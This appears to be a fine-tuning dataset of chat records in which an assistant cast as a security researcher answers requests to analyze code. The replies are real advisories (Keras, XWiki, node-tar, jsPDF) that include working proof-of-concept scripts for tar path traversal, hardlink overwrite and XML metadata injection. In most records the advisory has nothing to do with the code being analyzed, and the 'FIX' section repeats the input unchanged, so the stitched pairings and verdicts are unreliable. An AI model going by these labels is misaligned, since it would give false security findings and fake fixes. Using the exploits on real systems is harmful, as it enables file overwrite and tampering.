\u2014 discovery and report.\n- **Oscar Uribe** (Fluid Attacks) \u2014 coordination and disclosure.\nFIX:\nbool BrowserView::IsVisible() const {\n  return frame_->IsVisible();\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Keras Directory Traversal Vulnerability:\n\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ## Summary\n\nKeras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter=\"data\"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.\n\n## Details\n\n### Root Cause Analysis\n\n**Current Keras Implementation**\n```python\n# From keras/src/utils/file_utils.py#L121\nif zipfile.is_zipfile(file_path):\n    # Zip archive.\n    archive.extractall(path)\nelse:\n    # Tar archive, perhaps unsafe. Filter paths.\n    archive.extractall(path, members=filter_safe_paths(archive))\n```\n\n### The Critical Flaw\n\nWhile Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.\n\n**Exploitation Flow:**\n1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe\n2. **Extraction begins**: `extractall()` processes the filtered members\n3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits\n4. **Security bypass**: Failed resolution causes literal path interpretation\n5. **Directory traversal**: Files written outside intended directory\n\n### Technical Details\n\nThe vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:\n\n- `filter_safe_paths()` operates on the parsed tar member information\n- The PATH_MAX bug occurs during actual file system operations in `extractall()`\n- Failed symlink resolution falls back to literal path interpretation\n- This allows traversal paths like `../../../../etc/passwd` to be written\n\n### Affected Code Location\n\n**File**: `keras/src/utils/file_utils.py`  \n**Function**: `extract_archive()` around line 121  \n**Issue**: Missing `filter=\"data\"` parameter in `tarfile.extractall()`\n\n## Proof of Concept\n```\n#!/usr/bin/env python3\nimport os, io, sys, tarfile, pathlib, platform, threading, time\nimport http.server, socketserver\n\n# Import Keras directly (not through TensorFlow)\ntry:\n    import keras\n    print(\"Using standalone Keras:\", keras.__version__)\n    get_file = keras.utils.get_file\nexcept ImportError:\n    try:\n        import tensorflow as tf\n        print(\"Using Keras via TensorFlow:\", tf.keras.__version__)\n        get_file = tf.keras.utils.get_file\n    except ImportError:\n        print(\"Neither Keras nor TensorFlow found!\")\n        sys.exit(1)\n\nprint(\"=\" * 60)\nprint(\"Keras get_file() PATH_MAX Symlink Vulnerability PoC\")\nprint(\"=\" * 60)\nprint(\"Python:\", sys.version.split()[0])\nprint(\"Platform:\", platform.platform())\n\nroot = pathlib.Path.cwd()\nprint(f\"Working directory: {root}\")\n\n# Create target directory for exploit demonstration\nexploit_dir = root / \"exploit\"\nexploit_dir.mkdir(exist_ok=True)\n\n# Clean up any previous exploit files\ntry:\n    (exploit_dir / \"keras_pwned.txt\").unlink()\nexcept FileNotFoundError:\n    pass\n\nprint(f\"\\n=== INITIAL STATE ===\")\nprint(f\"Exploit directory: {exploit_dir}\")\nprint(f\"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}\")\n\n# Create malicious tar with PATH_MAX symlink resolution bug\nprint(f\"\\n=== Building PATH_MAX Symlink Exploit ===\")\n\n# Parameters for PATH_MAX exploitation\ncomp = 'd' * (55 if sys.platform == 'darwin' else 247)\nsteps = \"abcdefghijklmnop\"  # 16-step symlink chain\npath = \"\"\n\nwith tarfile.open(\"keras_dataset.tgz\", mode=\"w:gz\") as tar:\n    print(\"Creating deep symlink chain...\")\n    \n    # Build the symlink chain that will exceed PATH_MAX during resolution\n    for i, step in enumerate(steps):\n        # Directory with long name\n        dir_info = tarfile.TarInfo(os.path.join(path, comp))\n        dir_info.type = tarfile.DIRTYPE\n        tar.addfile(dir_info)\n        \n        # Symlink pointing to that directory\n        link_info = tarfile.TarInfo(os.path.join(path, step))\n        link_info.type = tarfile.SYMTYPE\n        link_info.linkname = comp\n        tar.addfile(link_info)\n        \n        path = os.path.join(path, comp)\n        \n        if i < 3 or i % 4 == 0:  # Print progress for first few and every 4th\n            print(f\"  Step {i+1}: {step} -> {comp[:20]}...\")\n    \n    # Create the final symlink that exceeds PATH_MAX\n    # This is where the symlink resolution breaks down\n    long_name = \"x\" * 254\n    linkpath = os.path.join(\"/\".join(steps), long_name)\n    \n    max_link = tarfile.TarInfo(linkpath)\n    max_link.type = tarfile.SYMTYPE\n    max_link.linkname = (\"../\" * len(steps))\n    tar.addfile(max_link)\n    \n    print(f\"\u2713 Created PATH_MAX symlink: {len(linkpath)} characters\")\n    print(f\"  Points to: {'../' * len(steps)}\")\n    \n    # Exploit file through the broken symlink resolution\n    exploit_path = linkpath + \"/../../../exploit/keras_pwned.txt\"\n    exploit_content = b\"KERAS VULNERABILITY CONFIRMED!\\nThis file was created outside the cache directory!\\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\\n\"\n    \n    exploit_file = tarfile.TarInfo(exploit_path)\n    exploit_file.type = tarfile.REGTYPE\n    exploit_file.size = len(exploit_content)\n    tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))\n    \n    print(f\"\u2713 Added exploit file via broken symlink path\")\n    \n    # Add legitimate dataset content\n    dataset_content = b\"# Keras Dataset Sample\\nThis appears to be a legitimate ML dataset\\nimage1.jpg,cat\\nimage2.jpg,dog\\nimage3.jpg,bird\\n\"\n    dataset_file = tarfile.TarInfo(\"dataset/labels.csv\")\n    dataset_file.type = tarfile.REGTYPE\n    dataset_file.size = len(dataset_content)\n    tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))\n    \n    # Dataset directory\n    dataset_dir = tarfile.TarInfo(\"dataset/\")\n    dataset_dir.type = tarfile.DIRTYPE\n    tar.addfile(dataset_dir)\n\nprint(\"\u2713 Malicious Keras dataset created\")\n\n# Comparison Test: Python tarfile with filter (SAFE)\nprint(f\"\\n=== COMPARISON: Python tarfile with data filter ===\")\ntry:\n    with tarfile.open(\"keras_dataset.tgz\", \"r:gz\") as tar:\n        tar.extractall(\"python_safe\", filter=\"data\")\n    \n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"\u2713 Python safe extraction completed\")\n    print(f\"Files in exploit/: {files_after}\")\n    \n    # Cleanup\n    import shutil\n    if pathlib.Path(\"python_safe\").exists():\n        shutil.rmtree(\"python_safe\", ignore_errors=True)\n        \nexcept Exception as e:\n    print(f\"\u274c Python safe extraction blocked: {str(e)[:80]}...\")\n    files_after = [f.name for f in exploit_dir.iterdir()]\n    print(f\"Files in exploit/: {files_after}\")\n\n# Start HTTP server to serve malicious archive\nclass SilentServer(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *args): pass\n\ndef run_server():\n    with socketserver.TCPServer((\"127.0.0.1\", 8005), SilentServer) as httpd:\n        httpd.allow_reuse_address = True\n        httpd.serve_forever()\n\nserver = threading.Thread(target=run_server, daemon=True)\nserver.start()\ntime.sleep(0.3)\n\n# Keras vulnerability test\ncache_dir = root / \"keras_cache\"\ncache_dir.mkdir(exist_ok=True)\nurl = \"http://127.0.0.1:8005/keras_dataset.tgz\"\n\nprint(f\"\\n=== KERAS VULNERABILITY TEST ===\")\nprint(f\"Testing: keras.utils.get_file() with extract=True\")\nprint(f\"URL: {url}\")\nprint(f\"Cache: {cache_dir}\")\nprint(f\"Expected extraction: keras_cache/datasets/keras_dataset/\")\nprint(f\"Exploit target: exploit/keras_pwned.txt\")\n\ntry:\n    # The vulnerable Keras call\n    extracted_path = get_file(\n        \"keras_dataset\",\n        url,\n        cache_dir=str(cache_dir),\n        extract=True\n    )\n    print(f\"\u2713 Keras extraction completed\")\n    print(f\"\u2713 Returned path: {extracted_path}\")\n    \nexcept Exception as e:\n    print(f\"\u274c Keras extraction failed: {e}\")\n    import traceback\n    traceback.print_exc()\n\n# Vulnerability assessment\nprint(f\"\\n=== VULNERABILITY RESULTS ===\")\nfinal_exploit_files = [f.name for f in exploit_dir.iterdir()]\nprint(f\"Files in exploit directory: {final_exploit_files}\")\n\nif \"keras_pwned.txt\" in final_exploit_files:\n    print(f\"\\n\ud83d\udea8 KERAS VULNERABILITY CONFIRMED! \ud83d\udea8\")\n    \n    exploit_file = exploit_dir / \"keras_pwned.txt\"\n    content = exploit_file.read_text()\n    print(f\"Exploit file created: {exploit_file}\")\n    print(f\"Content:\\n{content}\")\n    \n    print(f\"\ud83d\udd0d TECHNICAL DETAILS:\")\n    print(f\"   \u2022 Keras uses tarfile.extractall() without filter parameter\")\n    print(f\"   \u2022 PATH_MAX symlink resolution bug bypassed security checks\")\n    print(f\"   \u2022 File created outside intended cache directory\")\n    print(f\"   \u2022 Same vulnerability pattern as TensorFlow get_file()\")\n    \n    print(f\"\\n\ud83d\udcca COMPARISON RESULTS:\")\n    print(f\"   \u2705 Python with filter='data': BLOCKED exploit\")\n    print(f\"   \u26a0\ufe0f  Keras get_file(): ALLOWED exploit\")\n    \nelse:\n    print(f\"\u2705 No exploit files detected\")\n    print(f\"Possible reasons:\")\n    print(f\"   \u2022 Keras version includes security patches\")\n    print(f\"   \u2022 Platform-specific path handling prevented exploit\")\n    print(f\"   \u2022 Archive extraction path differed from expected\")\n\n# Show what Keras actually extracted (safely)\nprint(f\"\\n=== KERAS EXTRACTION ANALYSIS ===\")\ntry:\n    if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():\n        keras_path = pathlib.Path(extracted_path)\n        print(f\"Keras extracted to: {keras_path}\")\n        \n        # Safely list contents\n        try:\n            contents = [item.name for item in keras_path.iterdir()]\n            print(f\"Top-level contents: {contents}\")\n            \n            # Count symlinks (indicates our exploit structure was created)\n            symlink_count = 0\n            for item in keras_path.iterdir():\n                try:\n                    if item.is_symlink():\n                        symlink_count += 1\n                except PermissionError:\n                    continue\n            \n            print(f\"Symlinks created: {symlink_count}\")\n            if symlink_count > 0:\n                print(f\"\u2713 PATH_MAX symlink chain was extracted\")\n                \n        except PermissionError:\n            print(f\"Permission errors in extraction directory (expected with symlink corruption)\")\n            \nexcept Exception as e:\n    print(f\"Could not analyze Keras extraction: {e}\")\n\nprint(f\"\\n=== REMEDIATION ===\")\nprint(f\"To fix this vulnerability, Keras should use:\")\nprint(f\"```python\")\nprint(f\"tarfile.extractall(path, filter='data')  # Safe\")\nprint(f\"```\")\nprint(f\"Instead of:\")\nprint(f\"```python\") \nprint(f\"tarfile.extractall(path)  # Vulnerable\")\nprint(f\"```\")\n\n# Cleanup\nprint(f\"\\n=== CLEANUP ===\")\ntry:\n    os.unlink(\"keras_dataset.tgz\")\n    print(f\"\u2713 Removed malicious tar file\")\nexcept:\n    pass\n\nprint(\"PoC completed!\")\n\n```\n### Environment Setup\n- **Python**: 3.8+ (tested on multiple versions)\n- **Keras**: Standalone Keras or TensorFlow.Keras\n- **Platform**: Linux, macOS, Windows (path handling varies)\n\n### Exploitation Steps\n\n1. **Create malicious tar archive** with PATH_MAX symlink chain\n2. **Host archive** on accessible HTTP server\n3. **Call `keras.utils.get_file()`** with `extract=True`\n4. **Observe directory traversal** - files written outside cache directory\n\n### Key Exploit Components\n\n- **Deep symlink chain**: 16+ nested symlinks with long directory names\n- **PATH_MAX overflow**: Final symlink path exceeding system limits\n- **Traversal payload**: Relative path traversal (`../../../target/file`)\n- **Legitimate disguise**: Archive contains valid-looking dataset files\n\n### Demonstration Results\n\n**Vulnerable behavior:**\n- Files extracted outside intended `cache_dir/datasets/` location\n- Security filtering bypassed completely\n- No error or warning messages generated\n\n**Expected secure behavior:**\n- Extraction blocked or confined to cache directory\n- Security warnings for suspicious archive contents\n\n## Impact\n\n### Vulnerability Classification\n- **Type**: Directory Traversal / Path Traversal (CWE-22)\n- **Severity**: High\n- **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity\n\n### Who Is Impacted\n\n**Direct Impact:**\n- Applications using `keras.utils.get_file()` with `extract=True`\n- Machine learning pipelines downloading and extracting datasets\n- Automated ML training systems processing external archives\n\n**Attack Scenarios:**\n1. **Malicious datasets**: Attacker hosts compromised ML dataset\n2. **Supply chain**: Legitimate dataset repositories compromised\n3. **Model poisoning**: Extraction writes malicious files alongside training data\n4. **System compromise**: Configuration files, executables written to system directories\n\n**Affected Environments:**\n- Research environments downloading public datasets\n- Production ML systems with automated dataset fetching\n- Educational platforms using Keras for tutorials\n- CI/CD pipelines training models with external data\n\n### Risk Assessment\n\n**High Risk Factors:**\n- Common usage pattern in ML workflows\n- No user awareness of extraction security\n- Silent failure mode (no warnings)\n- Cross-platform vulnerability\n\n**Potential Consequences:**\n- Arbitrary file write on target system\n- Configuration file tampering\n- Code injection via overwritten scripts\n- Data exfiltration through planted files\n- System compromise in containerized environments\n\n## Recommended Fix\n\n### Immediate Mitigation\n\nReplace the vulnerable extraction code with:\n\n```python\n# Secure implementation\nif zipfile.is_zipfile(file_path):\n    # Zip archive - implement similar filtering\n    archive.extractall(path, members=filter_safe_paths(archive))\nelse:\n    # Tar archive with proper security filter\n    archive.extractall(path, members=filter_safe_paths(archive), filter=\"data\")\n```\n\n### Long-term Solution\n\n1. **Add `filter=\"data\"` parameter** to all `tarfile.extractall()` calls\n2. **Implement comprehensive path validation** before extraction\n3. **Add extraction logging** for security monitoring\n4. **Consider sandboxed extraction** for untrusted archives\n5. **Update documentation** to warn about archive security risks\n\n### Backward Compatibility\n\nThe fix maintains full backward compatibility as `filter=\"data\"` is the recommended secure default for Python 3.12+.\n\n## References\n\n- [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters)\n- [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability\n- [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)\n\nNote: Reported in Huntr as well, but didn't get response\nhttps://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4\nFIX:\nread_fatal (void)\n{\n  pfatal (\"read error\");\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for XWiki Affected by Reflected Cross-Site Scripting (XSS) in Error Messages:\n\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-79\nREASON: ### Impact\nA reflected cross site scripting (XSS) vulnerability in XWiki allows an attacker to execute arbitrary actions in XWiki with the rights of the victim if the attacker manages to trick a victim into visiting a crafted URL. If the victim has administrative or programming rights, those rights can be exploited to gain full access to the XWiki installation.\n\n### Patches\nThis vulnerability has been patched in XWiki 17.8.0RC1, 17.4.5 and 16.10.12.\n\n### Workarounds\nThe [patch](https://github.com/xwiki/xwiki-platform/commit/8337ac8c3b19c37f306723b638b2cae8b0a57dbf#diff-8f16efedd19baae025db602d8736a105bfd8f72676af2c935b8195a0c356ee71) can be applied manually, only a single line in `templates/logging_macros.vm` needs to be changed, no restart is required.\n\n### References\n* https://github.com/xwiki/xwiki-platform/commit/8337ac8c3b19c37f306723b638b2cae8b0a57dbf\n* https://jira.xwiki.org/browse/XWIKI-23462\n\n### Attribution\n\nWe thank Mike Cole @mikecole-mg for discovering and reporting this vulnerability.\nFIX:\nSAPI_API SAPI_POST_READER_FUNC(sapi_read_standard_form_data)\n{\n\tint read_bytes;\n\tint allocated_bytes=SAPI_POST_BLOCK_SIZE+1;\n\n\tif ((SG(post_max_size) > 0) && (SG(request_info).content_length > SG(post_max_size))) {\n\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"POST Content-Length of %ld bytes exceeds the limit of %ld bytes\",\n\t\t\t\t\tSG(request_info).content_length, SG(post_max_size));\n\t\treturn;\n\t}\n\tSG(request_info).post_data = emalloc(allocated_bytes);\n\n\tfor (;;) {\n\t\tread_bytes = sapi_module.read_post(SG(request_info).post_data+SG(read_post_bytes), SAPI_POST_BLOCK_SIZE TSRMLS_CC);\n\t\tif (read_bytes<=0) {\n\t\t\tbreak;\n\t\t}\n\t\tSG(read_post_bytes) += read_bytes;\n\t\tif ((SG(post_max_size) > 0) && (SG(read_post_bytes) > SG(post_max_size))) {\n\t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"Actual POST length does not match Content-Length, and exceeds %ld bytes\", SG(post_max_size));\n\t\t\tbreak;\n\t\t}\n\t\tif (read_bytes < SAPI_POST_BLOCK_SIZE) {\n\t\t\tbreak;\n\t\t}\n\t\tif (SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE >= allocated_bytes) {\n\t\t\tallocated_bytes = SG(read_post_bytes)+SAPI_POST_BLOCK_SIZE+1;\n\t\t\tSG(request_info).post_data = erealloc(SG(request_info).post_data, allocated_bytes);\n\t\t}\n\t}\n\tSG(request_info).post_data[SG(read_post_bytes)] = 0;  /* terminating NULL */\n\tSG(request_info).post_data_length = SG(read_post_bytes);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization:\n\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          registration->application_parameter, registration->counter));\n   std::move(callback).Run(success);\n }\n"}, {"role": "assistant", "content": "VIOLATION: CWE-22\nREASON: ### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)\nFIX:\nvoid VirtualAuthenticator::AddRegistration(\n    blink::test::mojom::RegisteredKeyPtr registration,\n    AddRegistrationCallback callback) {\n  if (registration->application_parameter.size() != device::kRpIdHashLength) {\n    std::move(callback).Run(false);\n    return;\n  }\n\n  bool success = false;\n  std::tie(std::ignore, success) = state_->registrations.emplace(\n      std::move(registration->key_handle),\n       ::device::VirtualFidoDevice::RegistrationData(\n           crypto::ECPrivateKey::CreateFromPrivateKeyInfo(\n               registration->private_key),\n          base::make_span<device::kRpIdHashLength>(\n              registration->application_parameter),\n          registration->counter));\n   std::move(callback).Run(success);\n }\n"}]}
{"messages": [{"role": "user", "content": "analyze this code for security violations:\n\n/* TEMPLATE GENERATED TESTCASE FILE\nFilename: CWE190_Integer_Overflow__unsigned_int_rand_preinc_67a.c\nLabel Definition File: CWE190_Integer_Overflow.label.xml\nTemplate File: sources-sinks-67a.tmpl.c\n*/\n/*\n * @description\n * CWE: 190 Integer Overflow\n * BadSource: rand Set data to result of rand()\n * GoodSource: Set data to a small, non-zero number (two)\n * Sinks: increment\n *    GoodSink: Ensure there will not be an overflow before incrementing data\n *    BadSink : Increment data, which can cause an overflow\n * Flow Variant: 67 Data flow: data passed in a struct from one function to another in different source files\n *\n * */\n\n#include \"std_testcase.h\"\n\ntypedef struct _CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType\n{\n    unsigned int structFirst;\n} CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType;\n\n#ifndef OMITBAD\n\n/* bad function declaration */\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_67b_badSink(CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType myStruct);\n\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_bad()\n{\n    unsigned int data;\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType myStruct;\n    data = 0;\n    /* POTENTIAL FLAW: Use a random value */\n    data = (unsigned int)RAND32();\n    myStruct.structFirst = data;\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67b_badSink(myStruct);\n}\n\n#endif /* OMITBAD */\n\n#ifndef OMITGOOD\n\n/* goodG2B uses the GoodSource with the BadSink */\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_67b_goodG2BSink(CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType myStruct);\n\nstatic void goodG2B()\n{\n    unsigned int data;\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType myStruct;\n    data = 0;\n    /* FIX: Use a small, non-zero value that will not cause an overflow in the sinks */\n    data = 2;\n    myStruct.structFirst = data;\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67b_goodG2BSink(myStruct);\n}\n\n/* goodB2G uses the BadSource with the GoodSink */\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_67b_goodB2GSink(CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType myStruct);\n\nstatic void goodB2G()\n{\n    unsigned int data;\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_structType myStruct;\n    data = 0;\n    /* POTENTIAL FLAW: Use a random value */\n    data = (unsigned int)RAND32();\n    myStruct.structFirst = data;\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67b_goodB2GSink(myStruct);\n}\n\nvoid CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_good()\n{\n    goodG2B();\n    goodB2G();\n}\n\n#endif /* OMITGOOD */\n\n/* Below is the main(). It is only used when building this testcase on\n   its own for testing or for building a binary to use in testing binary\n   analysis tools. It is not used when compiling all the testcases as one\n   application, which is how source code analysis tools are tested. */\n\n#ifdef INCLUDEMAIN\n\nint main(int argc, char * argv[])\n{\n    /* seed randomness */\n    srand( (unsigned)time(NULL) );\n#ifndef OMITGOOD\n    printLine(\"Calling good()...\");\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_good();\n    printLine(\"Finished good()\");\n#endif /* OMITGOOD */\n#ifndef OMITBAD\n    printLine(\"Calling bad()...\");\n    CWE190_Integer_Overflow__unsigned_int_rand_preinc_67_bad();\n    printLine(\"Finished bad()\");\n#endif /* OMITBAD */\n    return 0;\n}\n\n#endif\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"integer_overflow\",\n  \"severity\": \"high\",\n  \"explanation\": \"This code performs arithmetic operations that can exceed the maximum size of the data type. This can lead to unexpected behavior, crashes, or security vulnerabilities.\",\n  \"risk\": \"Memory corruption, arbitrary code execution, denial of service, security bypass\",\n  \"compliant_patch\": \"\\n// FIXED: Add bounds checking before arithmetic operations\\n// Instead of: result = a + b;\\n// Use: if (b > INT_MAX - a) { handle_error(); }\\n//       result = a + b;\\n\\n// Or use safe arithmetic functions:\\n// if (!safe_add(a, b, &result)) { handle_error(); }\\n\",\n  \"source\": \"SARD-237281\",\n  \"cwe\": \"CWE-190\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for jsPDF Vulnerable to Stored XMP Metadata Injection (Spoofing & Integrity Violation):\n\naspath_empty (void)\n{\n  return aspath_parse (NULL, 0, 1); /* 32Bit ;-) */\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-20\nREASON: ### Impact\n\nUser control of the first argument of the `addMetadata` function allows users to inject arbitrary XML.\n\nIf given the possibility to pass unsanitized input to the `addMetadata` method, a user can inject arbitrary XMP metadata into the generated PDF. If the generated PDF is signed, stored or otherwise processed after, the integrity of the PDF can no longer be guaranteed.\n\nExample attack vector:\n\n```js\nimport { jsPDF } from \"jspdf\"\n\nconst doc = new jsPDF()\n\n// Input a string that closes the current XML tag and opens a new one.\n// We are injecting a fake \"dc:creator\" (Author) to spoof the document source.\nconst maliciousInput = '</jspdf:metadata></rdf:Description>' +\n    '<rdf:Description xmlns:dc=\"http://purl.org/dc/elements/1.1/\">' +\n    '<dc:creator>TRUSTED_ADMINISTRATOR</dc:creator>' + // <--- Spoofed Identity\n    '</rdf:Description>' +\n    '<rdf:Description><jspdf:metadata>'\n\n// The application innocently adds the user's input to the metadata\ndoc.addMetadata(maliciousInput, \"http://valid.namespace\")\n\ndoc.save(\"test.pdf\")\n```\n\n### Patches\n\nThe vulnerability has been fixed in jsPDF@4.1.0\n\n### Workarounds\n\nSanitize user input before passing it to the `addMetadata` method: escape XML entities. For 